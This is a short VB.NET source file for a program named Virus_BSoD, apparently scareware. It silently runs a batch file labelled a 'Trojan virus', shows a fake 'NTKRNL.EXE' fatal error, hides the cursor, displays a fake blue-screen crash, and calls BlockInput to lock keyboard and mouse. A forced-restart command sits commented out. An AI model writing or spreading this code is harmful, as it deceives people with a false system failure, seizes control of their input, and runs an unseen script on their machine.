Public Class Virus_BSoD
  Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
    Me.Hide()

    'Scary bat file for Trojan virus
    Process.Start("virus.bat")

    'Wait 15 seconds to open NTKRNL dialog
    Threading.Thread.Sleep(15000)

    'Open Msgbox to avoid having to wait for user click to continue
    Dim t As New System.Threading.Thread(AddressOf ShowMSG)
    t.Start()

    'Wait some time before BSoDeing
    Threading.Thread.Sleep(1200)

    'Disable Cursor on Window
    Cursor.Hide()

    'Show BSoD window
    Me.Show()

    'Disable Keyboard while form Is open
    BlockInput(1)

    'This will make the computer Restart
    'System.Diagnostics.Process.Start("shutdown", "-r -t 00")

  End Sub

  Private Sub show_bsod()
    Me.Location = New Point(0, 0)
    Me.Size = SystemInformation.PrimaryMonitorSize
  End Sub

  Private Sub ShowMSG()
    MessageBox.Show("NTKRNL.EXE has stopped running!", "Fatal Error", MessageBoxButtons.OK, MessageBoxIcon.Stop)
  End Sub

  Private Declare Function BlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer

End Class
